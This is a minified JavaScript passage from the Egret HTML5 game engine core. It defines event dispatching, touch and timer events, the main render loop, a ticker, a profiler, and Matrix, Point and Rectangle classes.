var egret;
(function (d) {
	var e = function () {
		function d() {
			this._hashCode = d.hashCount++
		}
		Object.defineProperty(d.prototype, "hashCode", {
			get : function () {
				return this._hashCode
			},
			enumerable : !0,
			configurable : !0
		});
		d.hashCount = 1;
		return d
	}
	();
	d.HashObject = e;
	e.prototype.__class__ = "egret.HashObject"
})(egret || (egret = {}));
var __extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c(a) {
			"undefined" === typeof a && (a = 300);
			d.call(this);
			this.objectPool = [];
			this._length = 0;
			1 > a && (a = 1);
			this.autoDisposeTime = a;
			this.frameCount = 0
		}
		__extends(c, d);
		c.prototype._checkFrame = function () {
			this.frameCount--;
			0 >= this.frameCount && this.dispose()
		};
		Object.defineProperty(c.prototype, "length", {
			get : function () {
				return this._length
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.push = function (a) {
			var b = this.objectPool;
			-1 == b.indexOf(a) && (b.push(a), this._length++, 0 == this.frameCount &&
				(this.frameCount = this.autoDisposeTime, c._callBackList.push(this)))
		};
		c.prototype.pop = function () {
			if (0 == this._length)
				return null;
			this._length--;
			return this.objectPool.pop()
		};
		c.prototype.dispose = function () {
			0 < this._length && (this.objectPool = [], this._length = 0);
			this.frameCount = 0;
			var a = c._callBackList,
			b = a.indexOf(this);
			-1 != b && a.splice(b, 1)
		};
		c._callBackList = [];
		return c
	}
	(d.HashObject);
	d.Recycler = e;
	e.prototype.__class__ = "egret.Recycler"
})(egret || (egret = {}));
(function (d) {
	d.__START_TIME;
	d.getTimer = function () {
		return Date.now() - d.__START_TIME
	}
})(egret || (egret = {}));
(function (d) {
	d.__callLaterFunctionList = [];
	d.__callLaterThisList = [];
	d.__callLaterArgsList = [];
	d.callLater = function (e, f) {
		for (var c = [], a = 0; a < arguments.length - 2; a++)
			c[a] = arguments[a + 2];
		d.__callLaterFunctionList.push(e);
		d.__callLaterThisList.push(f);
		d.__callLaterArgsList.push(c)
	}
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b, m) {
			"undefined" === typeof b && (b = !1);
			"undefined" === typeof m && (m = !1);
			e.call(this);
			this._eventPhase = 2;
			this._isPropagationImmediateStopped = this._isPropagationStopped = this._isDefaultPrevented = !1;
			this.isNew = !0;
			this._type = a;
			this._bubbles = b;
			this._cancelable = m
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "type", {
			get : function () {
				return this._type
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "bubbles", {
			get : function () {
				return this._bubbles
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "cancelable", {
			get : function () {
				return this._cancelable
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "eventPhase", {
			get : function () {
				return this._eventPhase
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "currentTarget", {
			get : function () {
				return this._currentTarget
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._setCurrentTarget = function (a) {
			this._currentTarget = a
		};
		Object.defineProperty(c.prototype, "target", {
			get : function () {
				return this._target
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.isDefaultPrevented = function () {
			return this._isDefaultPrevented
		};
		c.prototype.preventDefault = function () {
			this._cancelable && (this._isDefaultPrevented = !0)
		};
		c.prototype.stopPropagation = function () {
			this._bubbles && (this._isPropagationStopped = !0)
		};
		c.prototype.stopImmediatePropagation = function () {
			this._bubbles && (this._isPropagationImmediateStopped = !0)
		};
		c.prototype._reset = function () {
			this.isNew ? this.isNew = !1 : (this._isPropagationImmediateStopped =
						this._isPropagationStopped = this._isDefaultPrevented = !1, this._currentTarget = this._target = null, this._eventPhase = 2)
		};
		c._dispatchByTarget = function (a, b, m, c, e, f) {
			"undefined" === typeof e && (e = !1);
			"undefined" === typeof f && (f = !1);
			var g = a.eventRecycler;
			g || (g = a.eventRecycler = new d.Recycler);
			var l = g.pop();
			l ? l._type = m : l = new a(m);
			l._bubbles = e;
			l._cancelable = f;
			if (c)
				for (var k in c)
					l[k] = c[k], null !== l[k] && (c[k] = null);
			a = b.dispatchEvent(l);
			g.push(l);
			return a
		};
		c._getPropertyData = function (a) {
			var b = a._props;
			b || (b = a._props = {});
			return b
		};
		c.dispatchEvent = function (a, b, m, d) {
			"undefined" === typeof m && (m = !1);
			var e = c._getPropertyData(c);
			d && (e.data = d);
			c._dispatchByTarget(c, a, b, e, m)
		};
		c.ADDED_TO_STAGE = "addedToStage";
		c.REMOVED_FROM_STAGE = "removedFromStage";
		c.ADDED = "added";
		c.REMOVED = "removed";
		c.COMPLETE = "complete";
		c.ENTER_FRAME = "enterFrame";
		c.RENDER = "render";
		c.FINISH_RENDER = "finishRender";
		c.FINISH_UPDATE_TRANSFORM = "finishUpdateTransform";
		c.LEAVE_STAGE = "leaveStage";
		c.RESIZE = "resize";
		c.CHANGE = "change";
		return c
	}
	(d.HashObject);
	d.Event =
		e;
	e.prototype.__class__ = "egret.Event"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b, m) {
			"undefined" === typeof b && (b = !1);
			"undefined" === typeof m && (m = !1);
			e.call(this, a, b, m)
		}
		__extends(c, e);
		c.dispatchIOErrorEvent = function (a) {
			d.Event._dispatchByTarget(c, a, c.IO_ERROR)
		};
		c.IO_ERROR = "ioError";
		return c
	}
	(d.Event);
	d.IOErrorEvent = e;
	e.prototype.__class__ = "egret.IOErrorEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b, m, c, d, h, g, l, k, n) {
			"undefined" === typeof b && (b = !0);
			"undefined" === typeof m && (m = !0);
			"undefined" === typeof c && (c = 0);
			"undefined" === typeof d && (d = 0);
			"undefined" === typeof h && (h = 0);
			"undefined" === typeof g && (g = !1);
			"undefined" === typeof l && (l = !1);
			"undefined" === typeof n && (n = !1);
			e.call(this, a, b, m);
			this._localY = this._localX = this._stageY = this._stageX = 0;
			this.touchPointID = c;
			this._stageX = d;
			this._stageY = h;
			this.ctrlKey = g;
			this.altKey = l;
			this.touchDown = n
		}
		__extends(c, e);
		Object.defineProperty(c.prototype,
			"stageX", {
			get : function () {
				return this._stageX
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "stageY", {
			get : function () {
				return this._stageY
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "localX", {
			get : function () {
				return this._localX
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "localY", {
			get : function () {
				return this._localY
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._setCurrentTarget = function (a) {
			e.prototype._setCurrentTarget.call(this, a);
			a instanceof
			d.DisplayObject && (a = a.globalToLocal(this._stageX, this._stageY, d.Point.identity), this._localX = a.x, this._localY = a.y)
		};
		c.dispatchTouchEvent = function (a, b, m, e, f, h, g, l, k) {
			"undefined" === typeof m && (m = 0);
			"undefined" === typeof e && (e = 0);
			"undefined" === typeof f && (f = 0);
			"undefined" === typeof h && (h = !1);
			"undefined" === typeof g && (g = !1);
			"undefined" === typeof l && (l = !1);
			"undefined" === typeof k && (k = !1);
			var n = d.Event._getPropertyData(c);
			n.touchPointID = m;
			n._stageX = e;
			n._stageY = f;
			n.ctrlKey = h;
			n.altKey = g;
			n.shiftKey = l;
			n.touchDown =
				k;
			d.Event._dispatchByTarget(c, a, b, n, !0, !0)
		};
		c.TOUCH_TAP = "touchTap";
		c.TOUCH_MOVE = "touchMove";
		c.TOUCH_BEGIN = "touchBegin";
		c.TOUCH_END = "touchEnd";
		c.TOUCH_RELEASE_OUTSIDE = "touchReleaseOutside";
		c.TOUCH_ROLL_OUT = "touchRollOut";
		c.TOUCH_ROLL_OVER = "touchRollOver";
		c.TOUCH_OUT = "touchOut";
		c.TOUCH_OVER = "touchOver";
		return c
	}
	(d.Event);
	d.TouchEvent = e;
	e.prototype.__class__ = "egret.TouchEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b, m) {
			"undefined" === typeof b && (b = !1);
			"undefined" === typeof m && (m = !1);
			e.call(this, a, b, m)
		}
		__extends(c, e);
		c.dispatchTimerEvent = function (a, b) {
			d.Event._dispatchByTarget(c, a, b)
		};
		c.TIMER = "timer";
		c.TIMER_COMPLETE = "timerComplete";
		return c
	}
	(d.Event);
	d.TimerEvent = e;
	e.prototype.__class__ = "egret.TimerEvent"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.CAPTURING_PHASE = 1;
		d.AT_TARGET = 2;
		d.BUBBLING_PHASE = 3;
		return d
	}
	();
	d.EventPhase = e;
	e.prototype.__class__ = "egret.EventPhase"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			"undefined" === typeof a && (a = null);
			e.call(this);
			this._eventTarget = a ? a : this
		}
		__extends(c, e);
		c.prototype.addEventListener = function (a, b, m, c, e) {
			"undefined" === typeof c && (c = !1);
			"undefined" === typeof e && (e = 0);
			"undefined" === typeof c && (c = !1);
			"undefined" === typeof e && (e = 0);
			b || d.Logger.fatal("addEventListener\u4fa6\u542c\u51fd\u6570\u4e0d\u80fd\u4e3a\u7a7a");
			c ? (this._captureEventsMap || (this._captureEventsMap = {}), c = this._captureEventsMap) : (this._eventsMap || (this._eventsMap = {}), c = this._eventsMap);
			var f = c[a];
			f || (f = c[a] = []);
			this._insertEventBin(f, b, m, e)
		};
		c.prototype._insertEventBin = function (a, b, m, c) {
			for (var d = -1, e = a.length, f = 0; f < e; f++) {
				var l = a[f];
				if (l.listener === b && l.thisObject === m)
					return !1;
				-1 == d && l.priority < c && (d = f)
			}
			b = {
				listener : b,
				thisObject : m,
				priority : c
			};
			-1 != d ? a.splice(d, 0, b) : a.push(b);
			return !0
		};
		c.prototype.removeEventListener = function (a, b, m, c) {
			"undefined" === typeof c && (c = !1);
			if (c = c ? this._captureEventsMap : this._eventsMap) {
				var d = c[a];
				d && (this._removeEventBin(d, b, m), 0 ==
					d.length && delete c[a])
			}
		};
		c.prototype._removeEventBin = function (a, b, m) {
			for (var c = a.length, d = 0; d < c; d++) {
				var e = a[d];
				if (e.listener === b && e.thisObject === m)
					return a.splice(d, 1), !0
			}
			return !1
		};
		c.prototype.hasEventListener = function (a) {
			return this._eventsMap && this._eventsMap[a] || this._captureEventsMap && this._captureEventsMap[a]
		};
		c.prototype.willTrigger = function (a) {
			return this.hasEventListener(a)
		};
		c.prototype.dispatchEvent = function (a) {
			a._reset();
			a._target = this._eventTarget;
			a._setCurrentTarget(this._eventTarget);
			return this._notifyListener(a)
		};
		c.prototype._notifyListener = function (a) {
			var b = 1 == a._eventPhase ? this._captureEventsMap : this._eventsMap;
			if (!b)
				return !0;
			b = b[a.type];
			if (!b)
				return !0;
			for (var b = b.concat(), m = b.length, c = 0; c < m; c++) {
				var d = b[c];
				d.listener.call(d.thisObject, a);
				if (a._isPropagationImmediateStopped)
					break
			}
			return !a.isDefaultPrevented()
		};
		c.prototype.dispatchEventWith = function (a, b, m) {
			"undefined" === typeof b && (b = !1);
			d.Event.dispatchEvent(this, a, b, m)
		};
		return c
	}
	(d.HashObject);
	d.EventDispatcher = e;
	e.prototype.__class__ =
		"egret.EventDispatcher"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.reuseEvent = new d.Event("")
		}
		__extends(c, e);
		c.prototype.run = function () {
			d.Ticker.getInstance().run();
			d.Ticker.getInstance().register(this.renderLoop, this, Number.NEGATIVE_INFINITY);
			d.Ticker.getInstance().register(this.broadcastEnterFrame, this, Number.POSITIVE_INFINITY);
			this.touchContext.run()
		};
		c.prototype.renderLoop = function (a) {
			a = this.rendererContext;
			a.clearScreen();
			if (0 < d.__callLaterFunctionList.length) {
				var b = d.__callLaterFunctionList;
				d.__callLaterFunctionList =
					[];
				var m = d.__callLaterThisList;
				d.__callLaterThisList = [];
				var c = d.__callLaterArgsList;
				d.__callLaterArgsList = []
			}
			this.dispatchEventWith(d.Event.RENDER);
			d.Stage._invalidateRenderFlag && (this.broadcastRender(), d.Stage._invalidateRenderFlag = !1);
			b && this.doCallLaterList(b, m, c);
			this.stage._updateTransform();
			this.dispatchEventWith(d.Event.FINISH_UPDATE_TRANSFORM);
			this.stage._draw(a);
			this.dispatchEventWith(d.Event.FINISH_RENDER)
		};
		c.prototype.broadcastEnterFrame = function (a) {
			a = this.reuseEvent;
			a._type = d.Event.ENTER_FRAME;
			this.dispatchEvent(a);
			for (var b = d.DisplayObject._enterFrameCallBackList.concat(), m = b.length, c = 0; c < m; c++) {
				var e = b[c];
				a._target = e.display;
				a._setCurrentTarget(e.display);
				e.listener.call(e.thisObject, a)
			}
			b = d.Recycler._callBackList;
			for (c = b.length - 1; 0 <= c; c--)
				b[c]._checkFrame()
		};
		c.prototype.broadcastRender = function () {
			var a = this.reuseEvent;
			a._type = d.Event.RENDER;
			for (var b = d.DisplayObject._renderCallBackList.concat(), m = b.length, c = 0; c < m; c++) {
				var e = b[c];
				a._target = e.display;
				a._setCurrentTarget(e.display);
				e.listener.call(e.thisObject,
					a)
			}
		};
		c.prototype.doCallLaterList = function (a, b, m) {
			for (var c = a.length, d = 0; d < c; d++) {
				var e = a[d];
				null != e && e.apply(b[d], m[d])
			}
		};
		c.DEVICE_PC = "web";
		c.DEVICE_MOBILE = "native";
		return c
	}
	(d.EventDispatcher);
	d.MainContext = e;
	e.prototype.__class__ = "egret.MainContext"
})(egret || (egret = {}));
var testDeviceType = function () {
	if (!this.navigator)
		return !0;
	var d = navigator.userAgent.toLowerCase();
	return -1 != d.indexOf("mobile") || -1 != d.indexOf("android")
};
egret.MainContext.instance = new egret.MainContext;
egret.MainContext.deviceType = testDeviceType() ? egret.MainContext.DEVICE_MOBILE : egret.MainContext.DEVICE_PC;
(function (d) {
	var e = function () {
		function e() {
			this._tick = this._preDrawCount = this._updateTransformPerformanceCost = this._renderPerformanceCost = this._logicPerformanceCost = this._lastTime = 0;
			this._maxDeltaTime = 500;
			this._totalDeltaTime = 0
		}
		e.getInstance = function () {
			null == e.instance && (e.instance = new e);
			return e.instance
		};
		e.prototype.run = function () {
			d.Ticker.getInstance().register(this.update, this);
			//null == this._txt && (this._txt = new d.TextField, this._txt.size = 28, d.MainContext.instance.stage.addChild(this._txt));
			var c =
				d.MainContext.instance;
			c.addEventListener(d.Event.ENTER_FRAME, this.onEnterFrame, this);
			c.addEventListener(d.Event.RENDER, this.onStartRender, this);
			c.addEventListener(d.Event.FINISH_RENDER, this.onFinishRender, this);
			c.addEventListener(d.Event.FINISH_UPDATE_TRANSFORM, this.onFinishUpdateTransform, this)
		};
		e.prototype.onEnterFrame = function (c) {
			this._lastTime = d.getTimer()
		};
		e.prototype.onStartRender = function (c) {
			c = d.getTimer();
			this._logicPerformanceCost = c - this._lastTime;
			this._lastTime = c
		};
		e.prototype.onFinishUpdateTransform =
		function (c) {
			c = d.getTimer();
			this._updateTransformPerformanceCost = c - this._lastTime;
			this._lastTime = c
		};
		e.prototype.onFinishRender = function (c) {
			c = d.getTimer();
			this._renderPerformanceCost = c - this._lastTime;
			this._lastTime = c
		};
		e.prototype.update = function (c) {
			this._tick++;
			this._totalDeltaTime += c;
			if (this._totalDeltaTime >= this._maxDeltaTime) {
				c = (this._preDrawCount - 1).toString();
				var a = Math.ceil(this._logicPerformanceCost).toString() + "," + Math.ceil(this._updateTransformPerformanceCost).toString() + "," + Math.ceil(this._renderPerformanceCost).toString() +
					"," + Math.ceil(d.MainContext.instance.rendererContext.renderCost).toString();
				//this._txt.text = "draw:" + c + "\ncost:" + a + "\nFPS:" + Math.floor(1E3 * this._tick / this._totalDeltaTime).toString();
				this._tick = this._totalDeltaTime = 0
			}
			this._preDrawCount = 0
		};
		e.prototype.onDrawImage = function () {
			this._preDrawCount++
		};
		return e
	}
	();
	d.Profiler = e;
	e.prototype.__class__ = "egret.Profiler"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.apply(this, arguments);
			this._timeScale = 1;
			this._paused = !1;
			this.callBackList = []
		}
		__extends(c, e);
		c.prototype.run = function () {
			d.__START_TIME = (new Date).getTime();
			d.MainContext.instance.deviceContext.executeMainLoop(this.update, this)
		};
		c.prototype.update = function (a) {
			var b = this.callBackList.concat(),
			m = b.length;
			a *= this._timeScale;
			a *= this._timeScale;
			for (var c = 0; c < m; c++) {
				var d = b[c];
				d.listener.call(d.thisObject, a)
			}
		};
		c.prototype.register = function (a, b, m) {
			"undefined" ===
			typeof m && (m = 0);
			this._insertEventBin(this.callBackList, a, b, m)
		};
		c.prototype.unregister = function (a, b) {
			this._removeEventBin(this.callBackList, a, b)
		};
		c.prototype.setTimeout = function (a, b, m) {
			for (var c = [], e = 0; e < arguments.length - 3; e++)
				c[e] = arguments[e + 3];
			d.Logger.warning("Ticker#setTimeout\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03,\u8bf7\u4f7f\u7528egret.setTimeout");
			d.setTimeout.apply(null, [a, b, m].concat(c))
		};
		c.prototype.setTimeScale = function (a) {
			this._timeScale = a
		};
		c.prototype.getTimeScale = function () {
			return this._timeScale
		};
		c.prototype.pause = function () {
			this._paused = !0
		};
		c.prototype.resume = function () {
			this._paused = !1
		};
		c.getInstance = function () {
			null == c.instance && (c.instance = new c);
			return c.instance
		};
		return c
	}
	(d.EventDispatcher);
	d.Ticker = e;
	e.prototype.__class__ = "egret.Ticker"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.LEFT = "left";
		d.RIGHT = "right";
		d.CENTER = "center";
		d.JUSTIFY = "justify";
		d.CONTENT_JUSTIFY = "contentJustify";
		return d
	}
	();
	d.HorizontalAlign = e;
	e.prototype.__class__ = "egret.HorizontalAlign"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.TOP = "top";
		d.BOTTOM = "bottom";
		d.MIDDLE = "middle";
		d.JUSTIFY = "justify";
		d.CONTENT_JUSTIFY = "contentJustify";
		return d
	}
	();
	d.VerticalAlign = e;
	e.prototype.__class__ = "egret.VerticalAlign"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b) {
			"undefined" === typeof b && (b = 0);
			e.call(this);
			this._currentCount = 0;
			this.delay = a;
			this.repeatCount = b
		}
		__extends(c, e);
		c.prototype.currentCount = function () {
			return this._currentCount
		};
		Object.defineProperty(c.prototype, "running", {
			get : function () {
				return this._running
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.reset = function () {
			this.stop();
			this._currentCount = 0
		};
		c.prototype.start = function () {
			this._running || (this.lastTime = d.getTimer(), 0 != this._currentCount && (this._currentCount =
						0), d.Ticker.getInstance().register(this.onEnterFrame, this), this._running = !0)
		};
		c.prototype.stop = function () {
			this._running && (d.Ticker.getInstance().unregister(this.onEnterFrame, this), this._running = !1)
		};
		c.prototype.onEnterFrame = function (a) {
			a = d.getTimer();
			a - this.lastTime > this.delay && (this.lastTime = a, this._currentCount++, d.TimerEvent.dispatchTimerEvent(this, d.TimerEvent.TIMER), 0 < this.repeatCount && this._currentCount >= this.repeatCount && (this.stop(), d.TimerEvent.dispatchTimerEvent(this, d.TimerEvent.TIMER_COMPLETE)))
		};
		return c
	}
	(d.EventDispatcher);
	d.Timer = e;
	e.prototype.__class__ = "egret.Timer"
})(egret || (egret = {}));
(function (d) {
	d.getQualifiedClassName = function (d) {
		d = d.prototype ? d.prototype : d.__proto__;
		if (d.hasOwnProperty("__class__"))
			return d.__class__;
		var f = d.constructor.toString(),
		c = f.indexOf("("),
		f = f.substring(9, c);
		return d.__class__ = f
	}
})(egret || (egret = {}));
(function (d) {
	var e = {};
	d.getDefinitionByName = function (d) {
		if (!d)
			return null;
		var c = e[d];
		if (c)
			return c;
		for (var a = d.split("."), b = a.length, c = __global, m = 0; m < b; m++)
			if (c = c[a[m]], !c)
				return null;
		return e[d] = c
	}
})(egret || (egret = {}));
var __global = __global || this;
(function (d) {
	function e(a) {
		for (var b in f) {
			var m = f[b];
			m.delay -= a;
			0 >= m.delay && (m.listener.apply(m.thisObject, m.params), delete f[b])
		}
	}
	var f = {},
	c = 0;
	d.setTimeout = function (a, b, m) {
		for (var u = [], y = 0; y < arguments.length - 3; y++)
			u[y] = arguments[y + 3];
		u = {
			listener : a,
			thisObject : b,
			delay : m,
			params : u
		};
		0 == c && d.Ticker.getInstance().register(e, null);
		c++;
		f[c] = u;
		return c
	};
	d.clearTimeout = function (a) {
		delete f[a]
	}
})(egret || (egret = {}));
(function (d) {
	d.hasDefinition = function (e) {
		return d.getDefinitionByName(e) ? !0 : !1
	}
})(egret || (egret = {}));
(function (d) {
	d.toColorString = function (d) {
		if (isNaN(d) || 0 > d)
			d = 0;
		16777215 < d && (d = 16777215);
		for (d = d.toString(16).toUpperCase(); 6 > d.length; )
			d = "0" + d;
		return "#" + d
	}
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b, m, c, d, h) {
			"undefined" === typeof a && (a = 1);
			"undefined" === typeof b && (b = 0);
			"undefined" === typeof m && (m = 0);
			"undefined" === typeof c && (c = 1);
			"undefined" === typeof d && (d = 0);
			"undefined" === typeof h && (h = 0);
			e.call(this);
			this.a = a;
			this.b = b;
			this.c = m;
			this.d = c;
			this.tx = d;
			this.ty = h
		}
		__extends(c, e);
		c.prototype.prepend = function (a, b, m, c, d, e) {
			var f = this.tx;
			if (1 != a || 0 != b || 0 != m || 1 != c) {
				var l = this.a,
				k = this.c;
				this.a = l * a + this.b * m;
				this.b = l * b + this.b * c;
				this.c = k * a + this.d * m;
				this.d = k * b + this.d *
					c
			}
			this.tx = f * a + this.ty * m + d;
			this.ty = f * b + this.ty * c + e;
			return this
		};
		c.prototype.append = function (a, b, m, c, d, e) {
			var f = this.a,
			l = this.b,
			k = this.c,
			n = this.d;
			this.a = a * f + b * k;
			this.b = a * l + b * n;
			this.c = m * f + c * k;
			this.d = m * l + c * n;
			this.tx = d * f + e * k + this.tx;
			this.ty = d * l + e * n + this.ty;
			return this
		};
		c.prototype.prependMatrix = function (a) {
			this.prepend(a.a, a.b, a.c, a.d, a.tx, a.ty);
			return this
		};
		c.prototype.appendMatrix = function (a) {
			this.append(a.a, a.b, a.c, a.d, a.tx, a.ty);
			return this
		};
		c.prototype.prependTransform = function (a, b, m, d, e, f, g, l, k) {
			if (e %
				360) {
				var n = e * c.DEG_TO_RAD;
				e = Math.cos(n);
				n = Math.sin(n)
			} else
				e = 1, n = 0;
			if (l || k)
				this.tx -= l, this.ty -= k;
			f || g ? (f *= c.DEG_TO_RAD, g *= c.DEG_TO_RAD, this.prepend(e * m, n * m, -n * d, e * d, 0, 0), this.prepend(Math.cos(g), Math.sin(g), -Math.sin(f), Math.cos(f), a, b)) : this.prepend(e * m, n * m, -n * d, e * d, a, b);
			return this
		};
		c.prototype.appendTransform = function (a, b, m, d, e, f, g, l, k) {
			if (e % 360) {
				var n = e * c.DEG_TO_RAD;
				e = Math.cos(n);
				n = Math.sin(n)
			} else
				e = 1, n = 0;
			f || g ? (f *= c.DEG_TO_RAD, g *= c.DEG_TO_RAD, this.append(Math.cos(g), Math.sin(g), -Math.sin(f),
					Math.cos(f), a, b), this.append(e * m, n * m, -n * d, e * d, 0, 0)) : this.append(e * m, n * m, -n * d, e * d, a, b);
			if (l || k)
				this.tx -= l * this.a + k * this.c, this.ty -= l * this.b + k * this.d;
			return this
		};
		c.prototype.rotate = function (a) {
			var b = Math.cos(a);
			a = Math.sin(a);
			var m = this.a,
			c = this.c,
			d = this.tx;
			this.a = m * b - this.b * a;
			this.b = m * a + this.b * b;
			this.c = c * b - this.d * a;
			this.d = c * a + this.d * b;
			this.tx = d * b - this.ty * a;
			this.ty = d * a + this.ty * b;
			return this
		};
		c.prototype.skew = function (a, b) {
			a *= c.DEG_TO_RAD;
			b *= c.DEG_TO_RAD;
			this.append(Math.cos(b), Math.sin(b), -Math.sin(a),
				Math.cos(a), 0, 0);
			return this
		};
		c.prototype.scale = function (a, b) {
			this.a *= a;
			this.d *= b;
			this.c *= a;
			this.b *= b;
			this.tx *= a;
			this.ty *= b;
			return this
		};
		c.prototype.translate = function (a, b) {
			this.tx += a;
			this.ty += b;
			return this
		};
		c.prototype.identity = function () {
			this.a = this.d = 1;
			this.b = this.c = this.tx = this.ty = 0;
			return this
		};
		c.prototype.invert = function () {
			var a = this.a,
			b = this.b,
			m = this.c,
			c = this.d,
			d = this.tx,
			e = a * c - b * m;
			this.a = c / e;
			this.b = -b / e;
			this.c = -m / e;
			this.d = a / e;
			this.tx = (m * this.ty - c * d) / e;
			this.ty =  - (a * this.ty - b * d) / e;
			return this
		};
		c.transformCoords = function (a, b, m) {
			var c = d.Point.identity;
			c.x = a.a * b + a.c * m + a.tx;
			c.y = a.d * m + a.b * b + a.ty;
			return c
		};
		c.prototype.toArray = function (a) {
			this.array || (this.array = new Float32Array(9));
			a ? (this.array[0] = this.a, this.array[1] = this.b, this.array[2] = 0, this.array[3] = this.c, this.array[4] = this.d, this.array[5] = 0, this.array[6] = this.tx, this.array[7] = this.ty) : (this.array[0] = this.a, this.array[1] = this.b, this.array[2] = this.tx, this.array[3] = this.c, this.array[4] = this.d, this.array[5] = this.ty, this.array[6] = 0, this.array[7] =
					0);
			this.array[8] = 1;
			return this.array
		};
		c.identity = new c;
		c.DEG_TO_RAD = Math.PI / 180;
		return c
	}
	(d.HashObject);
	d.Matrix = e;
	e.prototype.__class__ = "egret.Matrix"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c(a, b) {
			"undefined" === typeof a && (a = 0);
			"undefined" === typeof b && (b = 0);
			d.call(this);
			this.x = a;
			this.y = b
		}
		__extends(c, d);
		c.prototype.clone = function () {
			return new c(this.x, this.y)
		};
		c.prototype.equals = function (a) {
			return this.x == a.x && this.y == a.y
		};
		c.distance = function (a, b) {
			return Math.sqrt((a.x - b.x) * (a.x - b.x) + (a.y - b.y) * (a.y - b.y))
		};
		c.identity = new c(0, 0);
		return c
	}
	(d.HashObject);
	d.Point = e;
	e.prototype.__class__ = "egret.Point"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c(a, b, m, c) {
			"undefined" === typeof a && (a = 0);
			"undefined" === typeof b && (b = 0);
			"undefined" === typeof m && (m = 0);
			"undefined" === typeof c && (c = 0);
			d.call(this);
			this.x = a;
			this.y = b;
			this.width = m;
			this.height = c
		}
		__extends(c, d);
		Object.defineProperty(c.prototype, "right", {
			get : function () {
				return this.x + this.width
			},
			set : function (a) {
				this.width = a - this.x
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "bottom", {
			get : function () {
				return this.y + this.height
			},
			set : function (a) {
				this.height =
					a - this.y
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.initialize = function (a, b, m, c) {
			this.x = a;
			this.y = b;
			this.width = m;
			this.height = c;
			return this
		};
		c.prototype.contains = function (a, b) {
			return this.x <= a && this.x + this.width >= a && this.y <= b && this.y + this.height >= b
		};
		c.prototype.intersects = function (a) {
			return this.contains(a.x, a.y) || this.contains(a.x, a.bottom) || this.contains(a.right, a.y) || this.contains(a.right, a.bottom) ? !0 : !1
		};
		c.prototype.clone = function () {
			return new c(this.x, this.y, this.width, this.height)
		};
		c.prototype.containsPoint =
		function (a) {
